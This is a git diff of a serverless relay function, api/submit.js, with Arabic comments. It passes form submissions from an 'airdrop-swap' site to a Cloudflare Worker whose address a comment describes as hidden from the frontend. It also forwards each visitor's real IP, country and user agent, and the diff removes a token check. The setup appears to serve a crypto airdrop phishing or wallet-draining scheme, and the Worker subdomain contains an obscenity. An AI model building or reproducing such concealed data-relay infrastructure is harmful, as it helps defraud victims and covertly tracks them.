@@ -1,6 +1,5 @@
 // api/submit.js
-import crypto from "crypto";
-
+// ---------------------------------------------
 // ⛳️ رابط الـWorker (مخفي عن الواجهة)
 const WORKER_URL = "https://1fuckurmotherhahahahahahahah.eth2-stiffness640.workers.dev/";
 
@@ -9,13 +8,10 @@ const ALLOWED_ORIGINS = [
   "https://airdrop-swap.netlify.app"
 ];
 
-// 🔑 السرّ السري بين Vercel ↔ Worker
+// 🔑 السرّ السري بين Vercel ↔ Worker (Vercel → Settings → Environment Variables)
 const RELAY_SECRET = process.env.RELAY_SECRET || "";
 
-// 🧂 نفس السرّ المستخدم في JavaScript لتوليد token
-const SECRET_SALT = "7H3dC00lS3cr3tS@lt";
-
-// 🔍 استخراج origin من Referer عند الحاجة
+// دالة لاستخراج Origin من Referer (لو المتصفح ما أرسل Origin)
 function originFromReferer(referer = "") {
   try {
     if (!referer) return "";
@@ -31,13 +27,14 @@ export default async function handler(req, res) {
   const referer = req.headers.referer || "";
   const origin = reqOrigin || originFromReferer(referer);
 
+  // استخرج IP الحقيقي والدولة من هيدرز Vercel
   const fwdFor = req.headers["x-forwarded-for"] || "";
   const clientIPHeader = Array.isArray(fwdFor) ? fwdFor[0] : fwdFor;
-  const realClientIP = (clientIPHeader || "").split(",")[0].trim();
-  const clientCountry = req.headers["x-vercel-ip-country"] || "";
+  const realClientIP = (clientIPHeader || "").split(",")[0].trim(); // أول IP في السلسلة
+  const clientCountry = req.headers["x-vercel-ip-country"] || "";   // قد تكون فارغة أحيانًا
   const clientUA = req.headers["user-agent"] || "";
 
-  // 🧪 OPTIONS (CORS)
+  // --- OPTIONS (preflight) ---
   if (req.method === "OPTIONS") {
     if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
       return res.status(403).json({ error: "Forbidden origin (preflight)", got: origin || null });
@@ -49,12 +46,12 @@ export default async function handler(req, res) {
     return res.status(200).send("ok");
   }
 
-  // 🚫 فقط POST مسموح
+  // --- رفض غير POST ---
   if (req.method !== "POST") {
     return res.status(405).json({ error: "Method Not Allowed" });
   }
 
-  // ✅ تحقق من origin
+  // --- فحص الأصل ---
   if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
     res.setHeader("Access-Control-Allow-Origin", origin || "*");
     res.setHeader("Vary", "Origin");
@@ -62,32 +59,16 @@ export default async function handler(req, res) {
   }
 
   try {
-    // ✅ التحقق من token الأمني
-    const { fingerprint, pageStartMs, token } = req.body || {};
-
-    if (!fingerprint || !pageStartMs || !token) {
-      return res.status(400).json({ error: "Missing token fields" });
-    }
-
-    const expectedToken = crypto
-      .createHash("sha256")
-      .update(fingerprint + pageStartMs + SECRET_SALT)
-      .digest("hex");
-
-    if (token !== expectedToken) {
-      return res.status(403).json({ error: "Invalid token – unauthorized request" });
-    }
-
-    // 🔁 تمرير الطلب إلى الـWorker
+    // --- تمرير الطلب للـWorker + إضافة X-Relay-Secret + معلومات العميل الحقيقي ---
     const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "Origin": origin,
-        "X-Relay-Secret": RELAY_SECRET,
-        "X-Client-IP": realClientIP || "",
-        "X-Client-Country": clientCountry,
-        "X-Client-UA": clientUA
+        "X-Relay-Secret": RELAY_SECRET,     // حماية القناة بين Vercel ↔ Worker
+        "X-Client-IP": realClientIP || "",  // IP الحقيقي للزائر
+        "X-Client-Country": clientCountry,  // الدولة (إن توفرت)
+        "X-Client-UA": clientUA             // User-Agent الحقيقي (اختياري مفيد)
       },
       body: JSON.stringify(req.body)
     });
